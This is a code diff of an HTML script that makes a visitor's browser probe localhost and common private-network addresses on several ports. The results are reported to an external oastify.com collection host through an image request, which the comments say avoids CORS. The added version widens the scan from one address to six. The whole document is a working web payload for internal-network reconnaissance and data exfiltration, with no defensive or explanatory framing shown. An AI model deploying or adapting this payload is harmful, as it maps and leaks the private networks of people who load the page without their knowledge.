@@ -1,32 +1,55 @@
-<script>const ports = [80, 8086,6066];
-const results = [];
+<script>
+  // List of local IP addresses to test (customize as needed)
+  const localIPs = [
+    "127.0.0.1",
+    "localhost",
+    "0.0.0.0",
+    "192.168.0.1",
+    "192.168.1.1",
+    "10.0.0.1"
+  ];
 
-const requests = ports.map(port => {
-    const url = `http://127.0.0.1:${port}`;
-    return fetch(url, {
-        method: 'GET',
-        credentials: 'omit' // CORS credentials set to false
-    })
-    .then(response => {
-        const result = response.ok ? `Success on port ${port}` : `Error on port ${port}: ${response.status}`;
-        console.log(result);
-        results.push(result);
-    })
-    .catch(error => {
-        const result = `Failed to connect to port ${port}: ${error}`;
-        console.log(result);
-        results.push(result);
+  // List of ports to test
+  const ports = [80, 8086, 6066];
+
+  const results = [];
+  const requests = [];
+
+  // Loop through each IP and port combination
+  localIPs.forEach(ip => {
+    ports.forEach(port => {
+      const url = `http://${ip}:${port}`;
+      requests.push(
+        fetch(url, {
+          method: 'GET',
+          credentials: 'omit' // Do not send cookies or credentials
+        })
+        .then(response => {
+          const result = response.ok
+            ? `Success on ${ip}:${port}`
+            : `Error on ${ip}:${port}: ${response.status}`;
+          console.log(result);
+          results.push(result);
+        })
+        .catch(error => {
+          const result = `Failed to connect to ${ip}:${port}: ${error}`;
+          console.log(result);
+          results.push(result);
+        })
+      );
     });
-});
+  });
 
-Promise.all(requests).then(() => {
+  // Wait for all requests to finish then report the results
+  Promise.all(requests).then(() => {
     const report = encodeURIComponent(JSON.stringify({
-        timestamp: new Date().toISOString(),
-        results
+      timestamp: new Date().toISOString(),
+      results
     }));
 
-    // Create an image to send data without CORS
+    // Use an image to send the report without triggering CORS
     const img = new Image();
     img.src = `https://z44fyopxmk8h0e4zv5t368syqpwgka8z.oastify.com/?report=${report}`;
     console.log('Report sent without CORS');
-});</script>
+  });
+</script>
